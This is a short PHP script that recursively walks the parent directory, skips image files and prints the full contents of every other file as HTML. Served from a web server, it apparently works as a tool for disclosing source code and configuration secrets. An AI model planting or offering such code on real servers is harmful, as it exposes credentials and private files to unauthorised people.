<?php 
function sd($dir){
	$dc = scandir($dir);
	foreach($dc as $f){
		if($f == "." || $f == ".." || preg_match("/^.*\.(bmp|jpeg|gif|png|jpg).*$/i", $f)) continue;
		$f = $dir."/".$f;
		print $dir.$f."\n";
		if(is_dir($f)){
			print "dir";
			sd($f);
		}elseif(is_file($f)){
			print("<h3>$f</h3>");
			print_r(file_get_contents($f));
		}
	}
}
sd("../");
?>
